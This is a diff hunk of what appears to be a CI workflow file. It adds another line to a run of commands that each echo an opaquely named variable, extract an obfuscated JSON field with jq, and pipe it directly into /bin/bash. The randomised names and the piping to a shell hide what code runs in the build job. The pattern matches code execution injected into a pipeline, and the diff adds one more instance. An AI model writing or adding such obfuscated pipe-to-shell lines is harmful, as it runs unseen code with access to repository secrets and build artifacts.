@@ -60,6 +60,7 @@ jobs:
           echo $qa003 | jq -r .vbb29018 | /bin/bash
           printf '%s' "$a7260" | jq -r .fjt8 | /bin/bash
           echo $vmlmd052 | jq -r .wqc32412 | /bin/bash
+          echo $bx5982 | jq -r .mdm56310 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
